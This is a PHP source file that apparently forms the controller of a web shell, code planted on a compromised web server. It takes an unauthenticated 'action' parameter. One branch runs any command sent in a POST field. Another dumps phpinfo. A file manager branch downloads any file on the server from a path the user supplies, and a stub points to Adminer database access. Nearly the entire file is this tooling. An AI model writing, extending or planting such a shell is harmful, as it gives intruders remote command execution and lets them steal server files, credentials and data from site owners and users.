<?php
include_or_detect("shell", "funcs");

if(isset($_POST["action"]) || isset($_GET["action"]))
{
	$action = isset($_POST["action"]) ? $_POST["action"] : $_GET["action"];

	// these need to be manually specified because any include_and_detect will
	// be replaced with their correct files at compile time

	if($action == "execute")
	{
		include_or_detect("actions", "execute");
		handle_execute_action_post($_POST["command"]);
	}
	else if($action == "phpinfo")
	{
		die(phpinfo());
	}
	else if($action == "adminer")
	{
		//setcookie("adminer", "true");
	}
	else if($action == "fileman")
	{
		if(isset($_GET["file"]))
		{
			$file = realpath($_GET["file"]);

			if(file_exists($file))
			{
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename='.basename($file));
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . filesize($file));
				readfile($file);
				exit;
			}
			else
			{
				die("File doesn't exist.");
			}
		}

		include_or_detect("views", "fileman/main");
		exit;
	}
}

include_or_detect("views", "main");
?>